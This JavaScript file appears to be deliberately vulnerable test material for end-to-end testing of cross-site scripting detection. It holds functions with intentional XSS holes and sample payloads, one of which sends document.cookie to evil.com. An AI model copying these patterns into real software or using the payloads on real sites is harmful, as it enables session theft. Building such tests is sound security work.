// XSS (Cross-Site Scripting) vulnerability examples for E2E testing

/**
 * VULNERABLE: XSS via innerHTML
 * User input is directly inserted into the DOM without sanitization
 */
function displayUserMessage(userMessage) {
    const outputDiv = document.getElementById('message-output');
    // VULNERABLE: innerHTML allows script injection
    outputDiv.innerHTML = userMessage;
}

/**
 * VULNERABLE: XSS via direct DOM manipulation
 * User-controlled content inserted without encoding
 */
function renderComment(commentText) {
    const commentDiv = document.createElement('div');
    commentDiv.className = 'comment';
    // VULNERABLE: Using innerHTML with user input
    commentDiv.innerHTML = '<p>' + commentText + '</p>';
    document.getElementById('comments').appendChild(commentDiv);
}

/**
 * VULNERABLE: XSS in element attributes
 * User input used in href attribute without validation
 */
function createProfileLink(username, userUrl) {
    const link = document.createElement('a');
    // VULNERABLE: href attribute can contain javascript: protocol
    link.href = userUrl;
    link.innerHTML = 'Visit ' + username + "'s profile";
    return link;
}

/**
 * VULNERABLE: XSS via eval
 * User input passed to eval
 */
function executeUserCode(code) {
    // VULNERABLE: eval with user input
    eval(code);
}

/**
 * VULNERABLE: document.write with user input
 */
function displayWelcomeMessage(name) {
    // VULNERABLE: document.write with unsanitized input
    document.write('<h1>Welcome, ' + name + '!</h1>');
}

// Example usage showing how these could be exploited
const maliciousInput = '<img src=x onerror="alert(document.cookie)">';
displayUserMessage(maliciousInput);

const maliciousComment = '<script>fetch("https://evil.com?cookie=" + document.cookie)</script>';
renderComment(maliciousComment);

const maliciousUrl = 'javascript:alert("XSS")';
createProfileLink('attacker', maliciousUrl);
